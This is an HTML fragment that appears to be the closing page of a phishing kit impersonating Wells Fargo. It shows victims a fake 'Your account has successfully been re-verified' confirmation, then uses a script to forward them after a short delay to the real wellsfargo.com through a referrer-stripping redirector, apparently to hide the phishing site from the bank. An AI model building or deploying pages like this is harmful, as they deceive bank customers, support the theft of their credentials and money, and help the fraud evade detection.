...
<body style="opacity: 1; visibility: visible;" class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">
    ...
    <div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="Wells Fargo - Application - About You" data-url="mainpage">
        ...
        <div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
            <div class="primary-content" style="width: 100%;">
                ...
                <div>
                    <div style="margin-top: 2rem; margin-bottom: 5rem; padding: 0; text-align: center;" class="section">
                        <div style="margin: .75rem 0;">
                            <img style="height: 125px;" src="assets/img/done.png" alt="">
                        </div>
                        <span style="font-size: 1rem;">
                            Your account has successfully been re-verified.
                            <br>
    ...
    <script>
        setTimeout(() => {
            window.location.href = 'https://nullreferer.com/?https://wellsfargo.com';
        }, 3500);
    </script>
</body>
